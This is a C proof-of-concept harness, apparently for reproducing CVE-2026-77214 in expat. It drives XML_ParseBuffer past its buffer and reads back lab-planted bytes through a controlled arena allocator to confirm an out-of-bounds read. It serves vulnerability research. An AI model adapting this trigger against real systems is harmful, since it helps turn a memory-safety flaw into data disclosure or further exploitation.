/* expatparsebuf2shell: controlled-allocator readback harness for
 * CVE-2026-77214.  The parser is still the REAL pinned XML_GetBuffer /
 * XML_ParseBuffer code; only its memory-handling suite is supplied by the
 * lab so that the bytes one byte-past the XML buffer are known.  Usage:
 *   harness-arena CAP LEN SEED
 * CAP must be 4096 (one arena slot), LEN > CAP.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <expat.h>

#define ARENA_SZ (1 << 20)
#define SLOT_SZ 4096
static unsigned char arena[ARENA_SZ] __attribute__((aligned(16)));
static size_t arena_off;
typedef struct { void *p; size_t sz; } Slot;
static Slot slots[4096];
static int nslots;
static unsigned char seen[65536];
static int seen_len;

static void *arena_malloc(size_t sz) {
    size_t aligned = (sz + 15) & ~(size_t)15;
    if (aligned == 0 || arena_off > ARENA_SZ || aligned > ARENA_SZ - arena_off)
        return NULL;
    void *p = arena + arena_off;
    arena_off += aligned;
    if (nslots < (int)(sizeof(slots) / sizeof(slots[0])))
        slots[nslots++] = (Slot){p, aligned};
    return p;
}

static void *arena_realloc(void *ptr, size_t sz) {
    if (!ptr) return arena_malloc(sz);
    for (int i = 0; i < nslots; i++) {
        if (slots[i].p == ptr) {
            if (sz <= slots[i].sz) return ptr;
            void *q = arena_malloc(sz);
            if (q) memcpy(q, ptr, slots[i].sz);
            return q;
        }
    }
    return NULL;
}

static void arena_free(void *ptr) { (void)ptr; }

static void cdata(void *userData, const XML_Char *s, int len) {
    (void)userData;
    for (int i = 0; i < len && seen_len < (int)sizeof(seen); i++)
        seen[seen_len++] = (unsigned char)s[i];
}

int main(int argc, char **argv) {
    if (argc < 4) {
        fprintf(stderr, "usage: %s CAP LEN SEED\n", argv[0]);
        return 2;
    }
    int cap = atoi(argv[1]), len = atoi(argv[2]), seed = atoi(argv[3]);
    if (cap != SLOT_SZ || len < cap || len > 65536) {
        fprintf(stderr, "need CAP=4096 and CAP <= LEN <= 65536\n");
        return 2;
    }

    XML_Memory_Handling_Suite suite = {arena_malloc, arena_realloc, arena_free};
    XML_Parser p = XML_ParserCreate_MM(NULL, &suite, NULL);
    if (!p) { fprintf(stderr, "XML_ParserCreate_MM failed\n"); return 2; }
    XML_SetCharacterDataHandler(p, cdata);

    char *buf = XML_GetBuffer(p, cap);
    if (!buf) { fprintf(stderr, "XML_GetBuffer failed\n"); return 2; }
    size_t buf_off = (size_t)(unsigned char *)buf - (size_t)arena;
    if (arena_off <= buf_off || arena_off - buf_off < (size_t)cap) {
        fprintf(stderr, "unexpected arena layout\n");
        return 2;
    }
    /* Reserve one 4096-byte slot immediately after the XML buffer and put
       lab-chosen bytes there; future parser allocations start after it. */
    arena_off = buf_off + 2 * SLOT_SZ;
    memset(buf, 'A', (size_t)cap);
    buf[0] = '<'; buf[1] = 'a'; buf[2] = '>';
    memset(arena + buf_off + SLOT_SZ, seed & 0xff, SLOT_SZ);
    fprintf(stderr, "buf_off=%zu chosen_off=%zu seed=0x%02x cap=%d len=%d\n",
            buf_off, buf_off + SLOT_SZ, seed & 0xff, cap, len);

    enum XML_Status st = XML_ParseBuffer(p, len, 1);
    int tail = 0;
    for (int i = seen_len - 1; i >= 0 && seen[i] == (unsigned char)(seed & 0xff); i--)
        tail++;
    fprintf(stderr, "status=%d error=%d cdata_len=%d tail_seed_count=%d tail=",
            (int)st, (int)XML_GetErrorCode(p), seen_len, tail);
    for (int i = seen_len - 64 < 0 ? 0 : seen_len - 64; i < seen_len; i++)
        fprintf(stderr, "%02x", seen[i]);
    fprintf(stderr, "\n");
    XML_ParserFree(p);
    return 0;
}
